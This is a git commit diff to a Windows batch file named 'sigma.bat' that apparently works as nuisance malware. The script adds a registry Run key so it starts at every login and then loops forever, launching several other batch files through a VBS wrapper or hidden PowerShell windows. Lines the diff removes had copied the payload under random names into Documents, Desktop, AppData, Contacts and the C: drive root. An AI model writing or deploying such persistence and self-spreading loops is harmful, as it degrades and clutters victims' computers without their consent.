f8d626a612fd599a70ed76a2834286f8ddf8396b
AXL.Alixx <58485851+axlalixx@users.noreply.github.com>
2024-12-20 02:51:42 +0000

    Update sigma.bat

--- sigma.bat
+++ sigma.bat
@@ -1,17 +1,27 @@
 @echo off
-copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\Captures\lolz.bat
+
+setlocal
+set "vbsFile=%PUBLIC%\vbs\file.vbs"
+
+copy "%PUBLIC%\sigma\startup.bat" "%USERPROFILE%\Captures\lolz.bat"
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "StartWare" /t REG_SZ /d "%USERPROFILE%\Captures\lolz.bat" /f
 
 :loop
-wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\filel.bat
-wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\file.bat
-wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\sigma.bat
-wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\copy.bat
-wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\startup.bat
-wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\lulz.bat
-copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\Documents\mk%random%4.bat
-copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\Desktop\mk%random%4.bat
-copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\AppData\mk%random%4.bat
-copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\Contacts\mk%random%4.bat
-copy %PUBLIC%\sigma\startup.bat C:\mk%random%4.bat
+
+if exist "%vbsFile%" (
+    wscript "%vbsFile%" "%PUBLIC%\sigma\filel.bat"
+    wscript "%vbsFile%" "%PUBLIC%\sigma\file.bat"
+    wscript "%vbsFile%" "%PUBLIC%\sigma\sigma.bat"
+    wscript "%vbsFile%" "%PUBLIC%\sigma\copy.bat"
+    wscript "%vbsFile%" "%PUBLIC%\sigma\startup.bat"
+    wscript "%vbsFile%" "%PUBLIC%\sigma\lulz.bat"
+) else (
+    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\file.bat"
+    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\sigma.bat"
+    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\copy.bat"
+    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\startup.bat"
+    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\filel.bat"
+    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\lulz.bat"
+)
+
 goto loop
